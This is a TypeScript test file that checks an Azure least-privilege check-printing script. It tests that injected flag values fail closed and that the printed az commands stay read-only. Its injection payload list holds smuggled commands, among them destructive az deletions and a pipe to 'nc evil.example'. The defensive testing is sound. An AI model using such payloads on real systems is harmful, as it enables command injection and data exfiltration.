// R2-D1 — Azure drill scripts
//
// Adversarial coverage for deploy/azure-identity-negative-checks.mjs: the
// least-privilege identity-negative printer (NEG-01..NEG-03, deployment
// procedure Phase D). Round-1 lanes never touch deploy/*.mjs; live-mode
// spawn gating lives in r2-d1-azure-drills-live-gating.test.ts. Hermetic:
// this file never passes --live, so nothing is spawned.
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { readFileSync } from "node:fs";
import { promisify } from "node:util";
import test from "node:test";

const execFileAsync = promisify(execFile);
const SCRIPT = new URL("../../deploy/azure-identity-negative-checks.mjs", import.meta.url).pathname;

interface ScriptResult {
  code: number;
  stdout: string;
  stderr: string;
}

async function runScript(args: readonly string[]): Promise<ScriptResult> {
  try {
    const { stdout, stderr } = await execFileAsync(process.execPath, [SCRIPT, ...args], {
      timeout: 20_000,
      maxBuffer: 10 * 1024 * 1024,
    });
    return { code: 0, stdout, stderr };
  } catch (error) {
    const failure = error as { code?: unknown; stdout?: unknown; stderr?: unknown };
    assert.equal(typeof failure.code, "number", `the script must exit with a numeric code, got ${String(failure.code)}`);
    return {
      code: failure.code as number,
      stdout: typeof failure.stdout === "string" ? failure.stdout : "",
      stderr: typeof failure.stderr === "string" ? failure.stderr : "",
    };
  }
}

const FLAGS = ["--app", "--rg", "--vault", "--principal", "--allowed-user"] as const;

// Payloads that previously interpolated verbatim into the printed NEG command
// strings (e.g. `az role assignment list --assignee "${principal}"`), where
// a quoting breakout reads as an executable mutation or a different assignee.
const INJECTION_PAYLOADS: ReadonlyArray<readonly [string, string]> = [
  ["command separator", "x; az role assignment create"],
  ["list separator", "x && az keyvault secret set"],
  ["pipe exfiltration shape", "x | nc evil.example 443"],
  ["command substitution", "$(az ad app delete --id 1)"],
  ["backtick substitution", "`az group delete`"],
  ["double-quote breakout", 'x" --assignee "attacker'],
  ["single-quote breakout", "x' --query 'x"],
  ["newline smuggling", "x\naz role assignment delete"],
  ["carriage-return smuggling", "x\r--malicious"],
  ["ANSI escape sequence", "x\u001b[2J"],
  ["leading whitespace", " x"],
  ["empty value", ""],
];

test("R2-D1 negative checks: shell-metacharacter payloads fail closed on every interpolated flag", async () => {
  for (const flag of FLAGS) {
    for (const [label, payload] of INJECTION_PAYLOADS) {
      const { code, stdout, stderr } = await runScript([flag, payload]);
      assert.equal(code, 2, `${flag} ${label}: must exit 2`);
      assert.equal(stdout, "", `${flag} ${label}: nothing may be printed before validation fails`);
      assert.ok(stderr.startsWith("azure-identity-negative-checks: "), `${flag} ${label}: bounded stderr names the script`);
      assert.ok(stderr.includes(flag), `${flag} ${label}: stderr names the offending flag`);
      assert.ok(!stderr.includes("at "), `${flag} ${label}: no stack trace leaks`);
    }
  }
});

test("R2-D1 negative checks: missing and flag-swallowing values fail closed", async () => {
  for (const flag of FLAGS) {
    for (const [label, args] of [
      ["trailing flag without value", [flag]] as const,
      ["flag swallows the next flag", [flag, "--live"]] as const,
    ]) {
      const { code, stdout, stderr } = await runScript([...args]);
      assert.equal(code, 2, `${flag} ${label}: must exit 2 (previously defaulted silently)`);
      assert.equal(stdout, "", `${flag} ${label}: no checks may be printed`);
      assert.match(stderr, /requires a value/u, `${flag} ${label}: stderr explains the missing value`);
    }
  }
});

test("R2-D1 negative checks: unknown flags fail closed instead of being silently ignored", async () => {
  for (const args of [["--bogus"], ["--liv"], ["--vaultt", "v"], ["--principal=p"]] as const) {
    const { code, stdout, stderr } = await runScript([...args]);
    assert.equal(code, 2, `${args.join(" ")}: must exit 2`);
    assert.equal(stdout, "", `${args.join(" ")}: nothing printed before the flag check`);
    assert.match(stderr, /unknown flag/u, `${args.join(" ")}: stderr names the unknown flag`);
  }
});

test("R2-D1 negative checks: NEG-01..NEG-03 print the exact read-only commands and expectations per Phase D", async () => {
  const { code, stdout, stderr } = await runScript(["--app", "poc-app", "--rg", "poc-rg", "--vault", "pockv", "--principal", "00000000-0000-0000-0000-000000000001"]);
  assert.equal(code, 0, "dry-run with valid identifiers succeeds");
  assert.equal(stderr, "");

  const ids = [...stdout.matchAll(/\[(NEG-0[123])\]/gu)].map((m) => m[1]);
  assert.deepEqual(ids, ["NEG-01", "NEG-02", "NEG-03"], "all three negative checks appear in order exactly once");

  // NEG-01: deployment identity absent from allowedPrincipals.identities.
  assert.match(stdout, /az containerapp auth show --name "poc-app" --resource-group "poc-rg" --query "properties\.identityProviders\.azureActiveDirectory\.validation\.defaultAuthorizationPolicy\.allowedPrincipals\.identities"/u, "NEG-01 queries the exact allowedPrincipals path");
  assert.match(stdout, /does NOT contain 00000000-0000-0000-0000-000000000001/u, "NEG-01 expectation names the deployment principal");

  // NEG-02: Key Vault secret read must be denied.
  assert.match(stdout, /az keyvault secret list --vault-name "pockv" --query "length\(@\)"/u, "NEG-02 lists vault secrets");
  assert.match(stdout, /403\/AuthorizationFailed/u, "NEG-02 expects the denial shape");

  // NEG-03: role assignments are exactly the minimal set.
  assert.match(stdout, /az role assignment list --assignee "00000000-0000-0000-0000-000000000001" --include-inherited/u, "NEG-03 lists assignments for the deployment identity");
  assert.match(stdout, /No Owner, Contributor, or Microsoft\.Authorization\/roleAssignments/u, "NEG-03 forbids escalation roles");

  // Every printed az command stays read-only.
  for (const line of stdout.split("\n")) {
    if (!line.trimStart().startsWith("$ az ")) continue;
    assert.match(line, /az (containerapp auth show|keyvault secret list|role assignment list) /u, `printed az command must be read-only, got: ${line.trim()}`);
  }

  assert.match(stdout, /DRY-RUN \(nothing executed\)/u, "dry-run mode banner");
  assert.match(stdout, /no command was executed/u, "dry-run completion statement");
  assert.match(stdout, /before external ingress is enabled \(Phase E\)/u, "the Phase E gate statement survives");
});

test("R2-D1 negative checks: defaults keep inert placeholders and GUID-shaped principals pass validation", async () => {
  const { code, stdout } = await runScript([]);
  assert.equal(code, 0);
  assert.match(stdout, /app "PREFIX-app", rg "RG", vault "PREFIX-kv"/u, "defaults are inert placeholders");
  assert.match(stdout, /DEPLOYMENT-IDENTITY-OBJECT-ID/u, "the principal default is an inert placeholder, never a real identifier");

  const guid = await runScript(["--principal", "12345678-90ab-cdef-1234-567890abcdef", "--allowed-user", "fedcba09-8765-4321-fedc-ba0987654321"]);
  assert.equal(guid.code, 0, "object-ID GUIDs (alphanumeric + hyphen) are admitted");
});

test("R2-D1 negative checks: source admits only the documented flags and never spawns a shell", () => {
  const source = readFileSync(SCRIPT, "utf8");
  assert.match(source, /KNOWN_FLAGS = new Set\(\["--live", "--app", "--rg", "--vault", "--principal", "--allowed-user"\]\)/u, "flag allow-list stays in sync with the usage line");
  assert.ok(!/spawn\([^)]*\{[^}]*shell/u.test(source), "no shell:true spawn option anywhere");
  assert.ok(!source.includes("execSync") && !source.includes("execFile("), "no exec-family spawn (shell-string APIs)");
});
